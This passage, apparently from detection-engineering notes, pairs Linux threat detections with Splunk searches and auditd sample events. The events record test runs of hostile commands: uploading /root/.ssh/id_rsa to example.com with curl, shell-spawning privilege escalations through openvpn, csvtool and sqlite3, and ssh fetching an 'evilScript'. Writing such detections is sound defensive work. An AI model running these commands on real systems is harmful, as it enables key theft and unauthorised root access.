type=USER_CMD msg=audit(03/20/2023 12:58:44.013:5557) : pid=16567 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=dd of=/dev/zero if=/var/log/syslog count= iflag=count_bytes terminal=pts/0 res=success' 
type=SYSCALL msg=audit(03/20/2023 12:57:51.015:5549) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x19f82b0 a1=0x19e7930 a2=0x19cdee0 a3=0x7ffe84cdf3e0 items=2 ppid=12751 pid=16511 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=dd exe=/usr/bin/dd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=dd_overwrite 
type=EXECVE msg=audit(03/20/2023 12:57:51.015:5549) : argc=4 a0=dd a1=of=/dev/zero a2=if=/var/log/syslog a3=count=iflag=count_bytes 
type=PATH msg=audit(03/20/2023 12:57:51.015:5549) : item=0 name=/usr/bin/dd inode=100817946 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:57:51.015:5549) : proctitle=dd of=/dev/zero if=/var/log/syslog count=iflag=count_bytes 
type=SYSCALL msg=audit(03/20/2023 12:57:43.223:5548) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x19f8440 a1=0x19caec0 a2=0x19cdee0 a3=0x7ffe84cdf3e0 items=2 ppid=12751 pid=16510 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=dd exe=/usr/bin/dd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=dd_overwrite 
type=EXECVE msg=audit(03/20/2023 12:57:43.223:5548) : argc=5 a0=dd a1=of=/dev/zero a2=if=/var/log/syslog a3=count= a4=iflag=count_bytes 
type=PATH msg=audit(03/20/2023 12:57:43.223:5548) : item=0 name=/usr/bin/dd inode=100817946 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:57:43.223:5548) : proctitle=dd of=/dev/zero if=/var/log/syslog count= iflag=count_bytes 
type=CONFIG_CHANGE msg=audit(03/20/2023 12:57:33.512:5546) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=dd_overwrite list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 12:57:33.512:5476) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=dd_overwrite list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 12:57:29.166:5400) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=dd_overwrite list=exit res=yes 
```  


### Linux Kworker Process In Writable Process Path

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations: Not able to deploy in Centos  
Sample events:    

```

```  



### Linux Ingress Tool Transfer Hunting

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/20/2023 12:46:02.845:5178) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x19f7420 a1=0x19f8250 a2=0x19cdee0 a3=0x7ffe84cdf3e0 items=2 ppid=12751 pid=15680 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/20/2023 12:46:02.845:5178) : argc=2 a0=curl a1=www.google.com 
type=PATH msg=audit(03/20/2023 12:46:02.845:5178) : item=0 name=/usr/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:46:02.845:5178) : proctitle=curl www.google.com 
type=SYSCALL msg=audit(03/20/2023 12:45:58.145:5177) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x19e7a80 a1=0x19f74e0 a2=0x19cdee0 a3=0x7ffe84cdf3e0 items=2 ppid=12751 pid=15679 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=wget exe=/usr/bin/wget subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/20/2023 12:45:58.145:5177) : argc=2 a0=wget a1=www.google.com 
type=PATH msg=audit(03/20/2023 12:45:58.145:5177) : item=0 name=/usr/bin/wget inode=100890640 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:45:58.145:5177) : proctitle=wget www.google.com 

```  




### Linux Adding Crontab Using List Parameter

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=CRED_ACQ msg=audit(03/20/2023 12:12:47.039:4525) : pid=13660 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_env,pam_unix acct=test-2 exe=/usr/bin/crontab hostname=? addr=? terminal=cron res=success' 
type=USER_ACCT msg=audit(03/20/2023 12:12:47.039:4524) : pid=13660 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_access,pam_unix,pam_localuser acct=test-2 exe=/usr/bin/crontab hostname=? addr=? terminal=cron res=success' 
type=SYSCALL msg=audit(03/20/2023 12:12:47.030:4523) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x19e7c30 a1=0x19ce350 a2=0x19cdee0 a3=0x7ffe84cdf3e0 items=2 ppid=12751 pid=13660 auid=test-2 uid=test-2 gid=test-2 euid=root suid=root fsuid=root egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=crontab exe=/usr/bin/crontab subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=crontab_list 
type=EXECVE msg=audit(03/20/2023 12:12:47.030:4523) : argc=2 a0=crontab a1=-l 
type=PATH msg=audit(03/20/2023 12:12:47.030:4523) : item=0 name=/usr/bin/crontab inode=100959688 dev=fd:00 mode=file,suid,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:crontab_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:12:47.030:4523) : proctitle=crontab -l 
type=CONFIG_CHANGE msg=audit(03/20/2023 12:12:38.341:4521) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=crontab_list list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 12:12:38.324:4453) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=crontab_list list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 12:12:34.674:4379) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=crontab_list list=exit res=yes 
type=CRED_ACQ msg=audit(03/20/2023 12:10:42.879:4236) : pid=13465 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_env,pam_unix acct=test-2 exe=/usr/bin/crontab hostname=? addr=? terminal=cron res=success' 
type=USER_ACCT msg=audit(03/20/2023 12:10:42.879:4235) : pid=13465 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_access,pam_unix,pam_localuser acct=test-2 exe=/usr/bin/crontab hostname=? addr=? terminal=cron res=success' 
```  



### Linux Proxy Socks Curl

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/20/2023 12:08:10.234:4206) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x561044233248 a1=0x561044245198 a2=0x561044259020 a3=0x0 items=2 ppid=13266 pid=13268 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/20/2023 12:08:10.234:4206) : argc=10 a0=curl a1=-x a2=http://user:pwd@ a3=curl a4=--preproxy a5=socks5://proxy.example a6=-x a7=http://http.example a8=https://example.com127.0.0.1:1234 a9=http://httpbin.org/ip 
type=PATH msg=audit(03/20/2023 12:08:10.234:4206) : item=0 name=/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:08:10.234:4206) : proctitle=curl -x http://user:pwd@ curl --preproxy socks5://proxy.example -x http://http.example https://example.com127.0.0.1:1234 http:// 
type=USER_CMD msg=audit(03/20/2023 12:08:10.226:4203) : pid=13266 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=curl -x http://user:pwd@ curl --preproxy socks5://proxy.example -x http://http.example https://example.com127.0.0.1:1234 http://httpbin.org/ip terminal=pts/0 res=success' 
type=SYSCALL msg=audit(03/20/2023 12:08:08.040:4201) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x19f80b0 a1=0x19d77d0 a2=0x19cdee0 a3=0x7ffe84cdf3e0 items=2 ppid=12751 pid=13265 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/20/2023 12:08:08.040:4201) : argc=10 a0=curl a1=-x a2=http://user:pwd@ a3=curl a4=--preproxy a5=socks5://proxy.example a6=-x a7=http://http.example a8=https://example.com127.0.0.1:1234 a9=http://httpbin.org/ip 
type=PATH msg=audit(03/20/2023 12:08:08.040:4201) : item=0 name=/usr/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:08:08.040:4201) : proctitle=curl -x http://user:pwd@ curl --preproxy socks5://proxy.example -x http://http.example https://example.com127.0.0.1:1234 http:// 
type=SYSCALL msg=audit(03/20/2023 12:07:43.427:4198) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5621f1b9f248 a1=0x5621f1bb1198 a2=0x5621f1bc4f80 a3=0x0 items=2 ppid=13262 pid=13264 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/20/2023 12:07:43.427:4198) : argc=6 a0=curl a1=--preproxy a2=socks5://proxy.example a3=-x a4=http://http.example a5=https://example.com 
type=PATH msg=audit(03/20/2023 12:07:43.427:4198) : item=0 name=/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:07:43.427:4198) : proctitle=curl --preproxy socks5://proxy.example -x http://http.example https://example.com 
type=USER_CMD msg=audit(03/20/2023 12:07:43.393:4195) : pid=13262 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=curl --preproxy socks5://proxy.example -x http://http.example https://example.com terminal=pts/0 res=success' 
type=SYSCALL msg=audit(03/20/2023 12:06:59.080:4186) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x561338a4b248 a1=0x561338a5d198 a2=0x561338a70f40 a3=0x0 items=2 ppid=13204 pid=13206 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/20/2023 12:06:59.080:4186) : argc=4 a0=curl a1=-F a2=userfile=@/root/.ssh/id_rsa a3=http://example.com 
type=PATH msg=audit(03/20/2023 12:06:59.080:4186) : item=0 name=/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:06:59.080:4186) : proctitle=curl -F userfile=@/root/.ssh/id_rsa http://example.com 
type=USER_CMD msg=audit(03/20/2023 12:06:59.043:4183) : pid=13204 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=curl -F userfile=@/root/.ssh/id_rsa http://example.com terminal=pts
```  

### Linux Change File Owner To Root

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/20/2023 11:59:28.831:3642) : pid=12522 uid=test-2 auid=test-2 ses=35 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=chown root evil2_bin terminal=pts/0 res=success' 
type=SYSCALL msg=audit(03/19/2023 18:53:10.993:895) : arch=x86_64 syscall=chown success=yes exit=0 a0=0x28c48f0 a1=root a2=root a3=0x1b items=1 ppid=2691 pid=2693 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=2 comm=yum exe=/usr/bin/python2.7 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemdfiles 

```  
 


### Linux Doas Conf File Creation
Auditd config:- Yes (-w /etc/doas.conf -p wa -k doasconf).  
CIM Mapping:- file_path, dest, file_create_time, file_name, process_guid.  
Search:- No change  
Limitations:-   
Known false positives:- if you create a file withouth doas being installed.  
Sample events:   
```
type=PATH msg=audit(01/05/2023 18:45:39.929:872) : item=1 name=/etc/doas.conf inode=33563215 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(01/05/2023 18:45:39.929:872) : proctitle=vi /etc/doas.conf 
```


### Linux Ngrok Reverse Proxy Usage

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/20/2023 11:55:44.418:3616) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x26866b0 a1=0x265e1a0 a2=0x265dee0 a3=0x7ffcda9c9160 items=1 ppid=10451 pid=12277 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=35 comm=ngrok exe=/usr/local/bin/ngrok subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=ngrok_reverse_proxy 
type=EXECVE msg=audit(03/20/2023 11:55:44.418:3616) : argc=3 a0=ngrok a1=http a2=9000 
type=PATH msg=audit(03/20/2023 11:55:44.418:3616) : item=0 name=/usr/local/bin/ngrok inode=68317430 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:admin_home_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 11:55:44.418:3616) : proctitle=ngrok http 9000 
type=CONFIG_CHANGE msg=audit(03/20/2023 11:55:34.167:3614) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=ngrok_reverse_proxy list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 11:55:34.167:3548) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=ngrok_reverse_proxy list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 11:55:27.786:3476) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=ngrok_reverse_proxy list=exit res=yes 
type=USER_CMD msg=audit(03/20/2023 11:53:26.036:3325) : pid=12054 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=tar xvzf /root/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/20/2023 11:52:56.953:3314) : pid=11994 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=tar xvzf /root/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/20/2023 11:52:32.627:3312) : pid=11992 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=snap install ngrok terminal=pts/1 res=failed' 
type=USER_CMD msg=audit(03/20/2023 11:52:14.032:3280) : pid=11920 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=snap install ngrok terminal=pts/1 res=failed' 

```  


### Linux Composer Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*composer*" AND Processes.process="*run-script*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_composer_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=CONFIG_CHANGE msg=audit(03/20/2023 11:47:21.424:3100) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=composer_priv_escalation list=exit res=yes 
type=USER_CMD msg=audit(03/20/2023 11:46:20.572:2968) : pid=11445 uid=test-2 auid=test-2 ses=35 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=composer run-script x terminal=pts/0 res=failed' 
type=EXECVE msg=audit(03/20/2023 11:46:08.277:2965) : argc=3 a0=chmod a1=+x a2=/usr/local/bin/composer 
type=PROCTITLE msg=audit(03/20/2023 11:46:08.277:2965) : proctitle=chmod +x /usr/local/bin/composer 
type=USER_CMD msg=audit(03/20/2023 11:40:22.732:2919) : pid=11052 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=php composer-setup.php --install-dir=/usr/local/bin --filename=composer terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/20/2023 11:37:41.631:2892) : pid=10874 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=php composer-setup.php --install-dir=/usr/local/bin --filename=composer terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/20/2023 11:37:21.858:2881) : pid=10815 uid=root auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=php composer-setup.php --install-dir=/usr/local/bin --filename=composer terminal=pts/1 res=success' 

```  



### Linux OpenVPN Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*openvpn*" AND Processes.process="*--dev*" AND Processes.process="*--script-security*" AND Processes.process="*--up*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_openvpn_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/20/2023 11:32:14.283:2813) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x2686570 a1=0x265ace0 a2=0x265dee0 a3=0x7ffcda9c9160 items=2 ppid=10451 pid=10468 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=35 comm=openvpn exe=/usr/sbin/openvpn subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=openvpn_priv_escalation 
type=EXECVE msg=audit(03/20/2023 11:32:14.283:2813) : argc=9 a0=openvpn a1=--dev a2=null a3=--script-security a4=2 a5=--up a6=/bin/sh a7=-c a8=sh 
type=PATH msg=audit(03/20/2023 11:32:14.283:2813) : item=0 name=/usr/sbin/openvpn inode=688390 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:openvpn_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 11:32:14.283:2813) : proctitle=openvpn --dev null --script-security 2 --up /bin/sh -c sh 
type=SYSCALL msg=audit(03/20/2023 11:31:58.287:2780) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5578057e7248 a1=0x5578057f9198 a2=0x55780580def0 a3=0x0 items=2 ppid=10440 pid=10444 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=34 comm=openvpn exe=/usr/sbin/openvpn subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=openvpn_priv_escalation 
type=EXECVE msg=audit(03/20/2023 11:31:58.287:2780) : argc=9 a0=openvpn a1=--dev a2=null a3=--script-security a4=2 a5=--up a6=/bin/sh a7=-c a8=sh 
type=PATH msg=audit(03/20/2023 11:31:58.287:2780) : item=0 name=/sbin/openvpn inode=688390 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:openvpn_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 11:31:58.287:2780) : proctitle=openvpn --dev null --script-security 2 --up /bin/sh -c sh 
type=USER_CMD msg=audit(03/20/2023 11:31:58.271:2777) : pid=10440 uid=test-2 auid=test-2 ses=34 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=openvpn --dev null --script-security 2 --up /bin/sh -c sh terminal=pts/0 res=success' 
type=CONFIG_CHANGE msg=audit(03/20/2023 11:31:46.182:2773) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=openvpn_priv_escalation list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 11:31:46.172:2709) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=openvpn_priv_escalation list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 11:31:32.876:2638) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=openvpn_priv_escalation list=exit res=yes 

```


### Linux Csvtool Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*csvtool*" AND Processes.process="*call*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_csvtool_privilege_escalation_filter`
```

Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/20/2023 11:26:35.914:2428) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211d090 a1=0x211b3a0 a2=0x20f2ee0 a3=0x7ffd64800120 items=3 ppid=1356 pid=9981 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=csvtool exe=/usr/bin/python3.6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=csvtool_priv_escaltion 
type=EXECVE msg=audit(03/20/2023 11:26:35.914:2428) : argc=4 a0=/usr/bin/python3 a1=/usr/local/bin/csvtool a2=call a3=/bin/sh 
type=PATH msg=audit(03/20/2023 11:26:35.914:2428) : item=0 name=/usr/local/bin/csvtool inode=688379 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 11:26:35.914:2428) : proctitle=/usr/bin/python3 /usr/local/bin/csvtool call /bin/sh 
type=USER_CMD msg=audit(03/20/2023 11:26:29.368:2427) : pid=9923 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=csvtool call /bin/sh terminal=pts/0 res=failed' 

```  



### Linux At Allow Config File Creation

Auditd config: Yes.  ["-w /etc/at.allow -p wa -k atallow", "-w /etc/at.deny -p wa -k atdeny"]
CIM Mapping: file_path, dest, file_create_time, file_name, process_guid.  
Search: No change required.  
Limitations:  
Sample events:    

```
type=PATH msg=audit(02/03/2023 19:04:34.591:925) : item=3 name=/etc/at.deny inode=33563218 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:etc_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
```



### Linux Sqlite3 Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*sqlite3*" AND Processes.process="*.shell*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_sqlite3_privilege_escalation_filter`
```

Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/20/2023 11:12:04.529:1997) : pid=8890 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=sqlite3 /dev/nul .shell /bin/bash terminal=pts/0 res=success' 
type=USER_CMD msg=audit(03/20/2023 11:11:47.494:1990) : pid=8885 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=sqlite3 /dev/nul .shell /bin/bash terminal=pts/0 res=success' 
type=CONFIG_CHANGE msg=audit(03/20/2023 11:10:57.396:1978) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=sqlite3_priv_escalation list=exit res=yes 
```  


### Linux Persistence and Privilege Escalation Risk Behavior

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations: Risk rule, requires other detections with risk are enabled   
Sample events:    

```


```  



### Linux SSH Remote Services Script Execute

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/20/2023 09:48:48.024:1079) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211ae10 a1=0x210bee0 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=3642 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=PROCTITLE msg=audit(03/20/2023 09:48:48.024:1079) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@192.168.56.102 http://example.com/evilScript 
